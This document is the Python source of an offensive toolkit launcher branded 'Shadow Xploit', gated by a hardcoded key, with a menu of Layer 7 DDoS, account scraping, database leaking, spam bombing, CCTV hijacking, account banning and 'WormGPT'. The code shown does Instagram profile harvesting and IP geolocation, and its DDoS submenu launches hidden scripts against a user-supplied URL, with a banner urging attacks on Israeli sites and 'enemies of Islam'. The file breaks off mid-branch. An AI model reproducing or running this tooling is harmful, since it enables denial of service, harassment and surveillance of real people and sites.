import useragent
import os
import sys
import time
import platform
import requests
import re
import json
import urllib
import colorama
import instaloader
from time import sleep
from datetime import datetime
from instaloader import instaloader
from colorama import init, Fore

def ig():
  ### colors
  RED = "\033[91m"
  GREEN = "\033[92m"
  BLUE = "\033[94m"
  YELLOW = "\033[1;93m"
  WHITE = "\033[1;97m"
  NORMAL = "\033[0;37m"
  OKGREEN = '\033[92m'
  WARNING = '\033[93m'
  YE = '\033[1;33m'
  BOLD = '\033[1m'
  ENDC = '\033[0m'
  CRED2 = "\33[91m"
  CBLUE2 = "\33[94m"
  ENDC = "\033[0m"
  now = datetime.now()
  current_time = now.strftime("%H:%M:%S")
  ### banner
  def banner():
              print (f"""{OKGREEN}    _____   ________________       ____  _____ _____   ________
   /  _/ | / / ___/_  __/   |     / __ \/ ___//  _/ | / /_  __/
   / //  |/ /\__ \ / / / /| |    / / / /\__ \ / //  |/ / / /   
 _/ // /|  /___/ // / / ___ |   / /_/ /___/ // // /|  / / /    
/___/_/ |_//____//_/ /_/  |_|   \____//____/___/_/ |_/ /_/     

{OKGREEN}Version 1.2 - 2024 coded by Mr,OwlBird05""")
  def start():
     banner()
     import instaloader, sys
     from instaloader import instaloader
     x = instaloader.Instaloader()
     try:
        print ()
        sleep(1)
        uname = input(f"\033[32mEnter a username instagram {CRED2}: \033[37m") #INPUT USER
        if uname == "":
           print("\033[1;31mUsername tidak ditemukan!\n")
           sys.exit()


        f = instaloader.Profile.from_username(x.context,uname)

        print("\033[32mUsername\033[0m :", f.username)
        print("\033[32mID\033[0m :", f.userid)
        print("\033[32mNama lengkap\033[0m :", f.full_name)
        print("\033[32mBiografi\033[0m :", f.biography)
        print("\033[32mNama kategori bisnis\033[0m :", f.business_category_name)
        print("\033[32mURL eksternal\033[0m :", f.external_url)
        print("\033[32mDiikuti orang\033[0m :", f.followed_by_viewer)
        print("\033[32mMengikuti\033[0m :", f.followees) #0000000000000
        print("\033[32mPengikut\033[0m :", f.followers)
        print("\033[32mMengikuti orang\033[0m :", f.follows_viewer)
        print("\033[32mDiblokir orang\033[0m :", f.blocked_by_viewer)
        print("\033[32mPernah memblokir orang\033[0m :", f.has_blocked_viewer)
        print("\033[32mPunya sorotan\033[0m :", f.has_highlight_reels)
        print("\033[32mPunya cerita publik\033[0m :", f.has_public_story)
        print("\033[32mTelah meminta orang\033[0m :", f.has_requested_viewer)
        print("\033[32mDiminta orang\033[0m :", f.requested_by_viewer)
        print("\033[32mMemiliki cerita yang dapat dilihat\033[0m :", f.has_viewable_story)
        print("\033[32mIGTV\033[0m :", f.igtvcount)
        print("\033[32mAkun bisnis\033[0m :", f.is_business_account)
        print("\033[32mAkun pribadi\033[0m :", f.is_private)
        print("\033[32mDiverifikasi\033[0m :", f.is_verified)
        print("\033[32mPostingan\033[0m :", f.mediacount)
        print("\033[32mURL foto profil\033[0m :", f.profile_pic_url)
        print ()

     except KeyboardInterrupt:
        print("")

     except EOFError:
        print("")
  start()

def IP_Track():
    RED = "\033[91m"
    GREEN = "\033[92m"
    BLUE = "\033[94m"
    YELLOW = "\033[1;93m"
    WHITE = "\033[1;97m"
    NORMAL = "\033[0;37m"
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    YE = '\033[1;33m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    CRED2 = "\33[91m"
    CBLUE2 = "\33[94m"
    ENDC = "\033[0m"
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    print("""\033[1;93m    ________     ____  _____ _____   ________
   /  _/ __ \   / __ \/ ___//  _/ | / /_  __/
   / // /_/ /  / / / /\__ \ / //  |/ / / /   
 _/ // ____/  / /_/ /___/ // // /|  / / /    
/___/_/       \____//____/___/_/ |_/ /_/   

Coded By Mr OwlBird05 x Shadow Xploit""")
    sleep(1)
    ip = input(f"{WHITE}\nEnter IP target {CRED2}: {YELLOW}") #INPUT IP ADDRESS
    print()
    print(f'{NORMAL}============= {YELLOW}SHOW INFORMATION IP ADDRESS {NORMAL}=============')
    req_api = requests.get(f"https://dikaardnt.com/api/ip/{ip}") #API IPWHOIS.IS
    ip_data = json.loads(req_api.text)
    time.sleep(2)
    print(f"{NORMAL}\nIP Target     :{YELLOW}", ip_data["query"])
    sleep(0.1)
    print(f"{NORMAL}ZIP           :{YELLOW}", ip_data["zip"])
    sleep(0.1)
    print(f"{NORMAL}Country       :{YELLOW}", ip_data["country"])
    sleep(0.1)
    print(f"{NORMAL}Country Code  :{YELLOW}", ip_data["countryCode"])
    sleep(0.1)
    print(f"{NORMAL}City          :{YELLOW}", ip_data["city"])
    sleep(0.1)
    print(f"{NORMAL}Region        :{YELLOW}", ip_data["regionName"])
    sleep(0.1)
    print(f"{NORMAL}Region Code   :{YELLOW}", ip_data["region"])
    sleep(0.1)
    print(f"{NORMAL}Latitude      :{YELLOW}", ip_data["lat"])
    sleep(0.1)
    print(f"{NORMAL}Longitude     :{YELLOW}", ip_data["lon"])
    sleep(0.1)
    print(f"{NORMAL}Time Zone     :{YELLOW}", ip_data["timezone"])
    sleep(0.1)
    print(f"{NORMAL}Date Time     :{YELLOW}", ip_data["datetime"])
    sleep(0.1)
    print(f"{NORMAL}ISP           :{YELLOW}", ip_data["isp"])
    sleep(0.1)
    print(f"{NORMAL}ORG           :{YELLOW}", ip_data["org"])
    sleep(0.1)
    print(f"{NORMAL}Capital       :{YELLOW}", ip_data["as"])
    sleep(0.1)
    lat = (ip_data['lat'])
    lon = (ip_data['lon'])
    print(f"{NORMAL}Maps          :{YELLOW}",f"https://www.google.com/maps/@{lat},{lon},20z")
    sleep(0.1)
    print(f"{NORMAL}Address       :{YELLOW}", ip_data["address"])
    print ()

def loading():
    animation = [
        "[\x1b[1;91m■\x1b[0m□□□□□□□□□]",
        "[\x1b[1;92m■■\x1b[0m□□□□□□□□]",
        "[\x1b[1;93m■■■\x1b[0m□□□□□□□]",
        "[\x1b[1;94m■■■■\x1b[0m□□□□□□]",
        "[\x1b[1;95m■■■■■\x1b[0m□□□□□]",
        "[\x1b[1;96m■■■■■■\x1b[0m□□□□]",
        "[\x1b[1;90m■■■■■■■\x1b[0m□□□]",
        "[\x1b[1;98m■■■■■■■■\x1b[0m□□]",
        "[\x1b[1;99m■■■■■■■■■\x1b[0m□]",
        "[\x1b[1;97m■■■■■■■■■■\x1b[0m]",
    ]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(
            f"\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChecking   \033[1;31m:\x1b[0m " + animation[i % len(animation)] + "\x1b[0m "
        )
        sys.stdout.flush()

def logo():
     print (f"""\033[1;31m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣏⠉⠉⠉⠉⠉⠉⢡⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
⠈⣿⣿⣿⣿⣦⣽⣦⡀⠀⠀⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠀⠀
⠀⠘⢿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠇⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⡟⢿⠻⠛⠙⠉⠋⠛⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⠀⠈⠙⢿⡇⣠⣤⣶⣶⣾⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠾⢇⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠱⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠤⢤⣀⣀⣀⣀⣀⣀⣠⣤⣤⣤⣬⣭⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣠⣴⣾⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣾⣿⣿⣿⣿⡿⠿⠛⠛⠻⣿⣿⣿⣿⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣘⡛⠿⢿⡿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣦⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⠿⠛⠉⠁⠀⠈⠉⠙⠛⠛⠻⠿⠿⠿⠿⠟⠛⠃⠀⠀⠀⠉⠉⠉⠛⠛⠛⠿⠿⠿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠈⠙⠛⠂
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
 \033[1;34m██████\033[1;31m╗    \033[1;34m█████\033[1;31m╗   \033[1;34m██████\033[1;31m╗   \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗             \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗
 \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m║ \033[1;34m██\033[1;31m╔╝             ╚\033[1;34m██\033[1;31m╗\033[1;34m██\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m███████\033[1;31m║  \033[1;34m██████\033[1;31m╔╝  \033[1;34m█████\033[1;31m╔╝    \033[1;34m███████\033[1;31m╗   ╚\033[1;34m███\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔═\033[1;34m██\033[1;31m╗    ╚══════╝   \033[1;34m██\033[1;31m╔\033[1;34m██\033[1;31m╗
 \033[1;34m██████\033[1;31m╔╝  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╗             \033[1;34m██\033[1;31m╔╝ \033[1;34m██\033[1;31m╗
 \033[1;31m╚═════╝   ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝             ╚═╝  ╚═╝
\033[1;34m╔═══════════════════════════════════════════════════════════╗
\033[1;34m║ \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mAuthor      \033[1;31m: \033[1;37mShadow Xploit                           \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mContact     \033[1;31m: \033[1;37mt.me/ShadowXploit                       \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mCommunity   \033[1;31m: \033[1;37mDARK XPLOITER | OFC                     \033[1;34m║
\033[1;34m╚═══════════════════════════════════════════════════════════╝
║                           \033[1;31mMENU                            \033[1;34m║
╔═══════════════════════════════════════════════════════════╗
\033[1;34m║ \033[1;31m[\033[1;37m01\033[1;31m] \033[1;34m║ \033[1;36mDDOS ATTACK LAYER 7 METHOD                         \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m02\033[1;31m] \033[1;34m║ \033[1;36mFREE VPS UBUNTU SERVER                             \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m03\033[1;31m] \033[1;34m║ \033[1;36mFREE RDP LINUX SERVER                              \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m04\033[1;31m] \033[1;34m║ \033[1;36mFILE DATABASE LEAKER  ️                             \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m05\033[1;31m] \033[1;34m║ \033[1;36mWEB ACCOUNT SCRAPER    ️                            \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m06\033[1;31m] \033[1;34m║ \033[1;36mOSINT INSTAGRAM ACCOUNT                            \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m07\033[1;31m] \033[1;34m║ \033[1;36mTRACK IP ADDRESS                                   \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m08\033[1;31m] \033[1;34m║ \033[1;36mWORM GPT AI TERMINAL                 ️              \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m09\033[1;31m] \033[1;34m║ \033[1;36mWORM GPT AI WEB                                    \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m10\033[1;31m] \033[1;34m║ \033[1;36mLINUX BANNER FOR TERMUX                            \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m11\033[1;31m] \033[1;34m║ \033[1;36mBRUTEFORCE ZIP WITH NUMBER WORDLIST                \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m12\033[1;31m] \033[1;34m║ \033[1;36mSPAM BRUTAL WHATSAPP +62                           \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m13\033[1;31m] \033[1;34m║ \033[1;36mSPAM API TELEGRAM UNDANGAN APK                     \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m14\033[1;31m] \033[1;34m║ \033[1;36mCCTV HIJACKER               ️                       \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m15\033[1;31m] \033[1;34m║ \033[1;36mBOT NULIS ONLINE                                   \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m16\033[1;31m] \033[1;34m║ \033[1;36mBANNED TIKTOK ACCOUNT                              \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m17\033[1;31m] \033[1;34m║ \033[1;36mPYTHON OBFUSCATE                                   \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m18\033[1;31m] \033[1;34m║ \033[1;36mUPDATE TOOLS                                       \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m00\033[1;31m] \033[1;34m║ \033[1;36mEXIT                                               \033[1;34m║
\033[1;34m╚═══════════════════════════════════════════════════════════╝
""")
#https://onecompiler.com/studio/jupyter-notebook
def logo2():
     print (f"""\033[1;31m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣏⠉⠉⠉⠉⠉⠉⢡⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
⠈⣿⣿⣿⣿⣦⣽⣦⡀⠀⠀⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠀⠀
⠀⠘⢿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠇⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⡟⢿⠻⠛⠙⠉⠋⠛⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⠀⠈⠙⢿⡇⣠⣤⣶⣶⣾⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠾⢇⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠱⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠤⢤⣀⣀⣀⣀⣀⣀⣠⣤⣤⣤⣬⣭⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣠⣴⣾⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣾⣿⣿⣿⣿⡿⠿⠛⠛⠻⣿⣿⣿⣿⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣘⡛⠿⢿⡿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣦⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⠿⠛⠉⠁⠀⠈⠉⠙⠛⠛⠻⠿⠿⠿⠿⠟⠛⠃⠀⠀⠀⠉⠉⠉⠛⠛⠛⠿⠿⠿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠈⠙⠛⠂
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
 \033[1;34m██████\033[1;31m╗    \033[1;34m█████\033[1;31m╗   \033[1;34m██████\033[1;31m╗   \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗             \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗
 \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m║ \033[1;34m██\033[1;31m╔╝             ╚\033[1;34m██\033[1;31m╗\033[1;34m██\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m███████\033[1;31m║  \033[1;34m██████\033[1;31m╔╝  \033[1;34m█████\033[1;31m╔╝    \033[1;34m███████\033[1;31m╗   ╚\033[1;34m███\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔═\033[1;34m██\033[1;31m╗    ╚══════╝   \033[1;34m██\033[1;31m╔\033[1;34m██\033[1;31m╗
 \033[1;34m██████\033[1;31m╔╝  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╗             \033[1;34m██\033[1;31m╔╝ \033[1;34m██\033[1;31m╗
 \033[1;31m╚═════╝   ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝             ╚═╝  ╚═╝
\033[1;34m╔═══════════════════════════════════════════════════════════╗
║                          \033[1;31mLICENSE                          \033[1;34m║
╚═══════════════════════════════════════════════════════════╝""")

os.system("cls" if os.name == "nt" else "clear")
def simpan_password(password):
    with open('.login.txt', 'w') as file:
        file.write(password)
def cek_login():
    try:
        with open('.login.txt', 'r') as file:
            password = file.read()
            return password
    except FileNotFoundError:
        return None
def login():
    stored_password = cek_login()
    if stored_password is not None and stored_password == '0838-7530-1505':
        os.system("cls" if os.name == "nt" else "clear")
        logo()
    else:
        logo2()
        input_password = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKey        \033[1;31m: \033[0;37m")
        loading()
        if input_password == '0838-7530-1505':
            simpan_password(input_password)
            print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;32mKey Valid!")
            time.sleep(3)
            os.system("cls" if os.name == "nt" else "clear")
            logo()
        else:
            print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;31mKey Invalid!")
            quit()
if os.path.exists('.login.txt'):
    login()
else:
    logo2()
    password = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKey        \033[1;31m: \033[0;37m")
    loading()
    if password == '0838-7530-1505':
        simpan_password(password)
        print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;32mKey Valid!")
        time.sleep(2)
        os.system("cls" if os.name == "nt" else "clear")
        logo()
    else:
        print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;31mKey Invalid!")
        sys.exit(0)

while True:
    try:
        message = input("\033[1;34m┌──(\033[1;31mdark-x㉿localhost\033[1;34m)-[\033[1;37m~\033[1;34m]\n└─\033[1;31m#\033[1;37m ")
        if message.strip():
            if message == "0" or message == "00":
                print(" \033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mProgram dihentikan")
                time.sleep(1)
                print()
                break
            elif message == "1" or message == "01":
                os.system("cls" if os.name == "nt" else "clear")
                time.sleep(1)
                # os.system("toilet -f standard 'Layer7 DDoS' -F metal")
                print("""\033[1;34m
 \033[1;34m██\033[1;31m╗       \033[1;34m█████\033[1;31m╗  \033[1;34m██\033[1;31m╗   \033[1;34m██\033[1;31m╗ \033[1;34m███████\033[1;31m╗ \033[1;34m██████\033[1;31m╗     \033[1;34m███████\033[1;31m╗
 \033[1;34m██\033[1;31m║      \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗ ╚\033[1;34m██\033[1;31m╗ \033[1;34m██\033[1;31m╔╝ \033[1;34m██\033[1;31m╔════╝ \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗    ╚════\033[1;34m██\033[1;31m║
 \033[1;34m██\033[1;31m║      \033[1;34m███████\033[1;31m║  ╚\033[1;34m████\033[1;31m╔╝  \033[1;34m█████\033[1;31m╗   \033[1;34m██████\033[1;31m╔╝        \033[1;34m██\033[1;31m╔╝
 \033[1;34m██\033[1;31m║      \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m║   ╚\033[1;34m██\033[1;31m╔╝   \033[1;34m██\033[1;31m╔══╝   \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗       \033[1;34m██\033[1;31m╔╝
 \033[1;34m███████\033[1;31m╗ \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║    \033[1;34m██\033[1;31m║    \033[1;34m███████\033[1;31m╗ \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║       \033[1;34m██\033[1;31m║
 \033[1;31m╚══════╝ ╚═╝  ╚═╝    ╚═╝    ╚══════╝ ╚═╝  ╚═╝       ╚═╝  
""")
                print('''                       \033[1;31mWARNING!!!
 DIMOHON KESADARANNYA UNTUK TIDAK MENARGETKAN WEB SEKOLAH,
 PEMERINTAH, DAN LAINNYA. KECUALI WEB SLOT, BOK*B, ISRAEL,
 DAN MUSUH-MUSUH ISLAM LAINNYA. KARENA SESUNGGUHNYA TUHAN
          MAHA MELIHAT APA YANG KAMU PERBUAT.
''')
                print(" \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mHTTPV1")
                print(" \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mHTTPV2")
                #print(" \033[1;31m[\033[1;37m3\033[1;31m] \033[1;36mHTTPV3")
                print(" \033[1;31m[\033[1;37m3\033[1;31m] \033[1;36mMIX")
                print(" \033[1;31m[\033[1;37m4\033[1;31m] \033[1;36mCF Bypass")
                #print(" \033[1;31m[\033[1;37m6\033[1;31m] \033[1;36mGET")
                #print(" \033[1;31m[\033[1;37m7\033[1;31m] \033[1;36mPOST")
                print(" \033[1;31m[\033[1;37m \033[1;31m] \033[1;36mBack To Menu")
                pilihan = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMethod \033[1;36m: \033[1;37m")
                if pilihan.endswith("1"):
                    os.system("python3 .l")
                    wait = input("\n \033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("2"):
                    time.sleep(1)
                    url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    if url.endswith("id"):
                        time.sleep(1)
                        print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        time.sleep(0.5)
                        sys.exit()
                    else:
                        os.system(f"python .f {url}")
                        wait = input("\n \033[1;33mPress Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                #elif pilihan.endswith("3"):
                    #os.system("cls" if os.name == "nt" else "clear")
                    #time.sleep(1)
                    #os.system("python3 .k")
                    #wait = input("\n\033[1;33mPress Enter to continue")
                    #os.system("cls" if os.name == "nt" else "clear")
                    #logo()
                elif pilihan.endswith("3"):
                    os.system("cls" if os.name == "nt" else "clear")
                    time.sleep(1)
                    os.system("python3 .m")
                    wait = input("\n\033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("4"):
                    time.sleep(1)
